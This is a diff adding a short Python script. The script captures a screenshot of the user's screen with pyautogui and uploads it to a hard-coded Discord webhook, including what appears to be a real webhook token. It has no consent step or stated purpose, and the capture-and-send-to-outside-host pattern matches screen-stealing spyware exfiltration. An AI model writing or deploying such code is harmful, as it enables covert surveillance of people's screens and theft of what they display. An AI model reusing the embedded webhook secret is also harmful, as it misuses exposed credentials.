@@ -1,0 +1,19 @@
+import pyautogui
+import requests
+
+# Your Discord Webhook URL
+WEBHOOK_URL = "https://discord.com/api/webhooks/1342227822261047356/RtOuOXGBJEBwS6VCo_K7IHuQha1-oed1Twa1riIfjsC6WCFUhc50rurVRKeXXJPGgDwj"  # Replace with your actual webhook URL
+
+# Capture a screenshot
+screenshot = pyautogui.screenshot()
+screenshot.save("screenshot.png")
+
+# Send the screenshot to Discord
+with open("screenshot.png", "rb") as file:
+    response = requests.post(WEBHOOK_URL, files={"file": file})
+
+# Check if the request was successful
+if response.status_code == 200 or response.status_code == 204:
+    print("Screenshot sent successfully!")
+else:
+    print("Failed to send:", response.text)
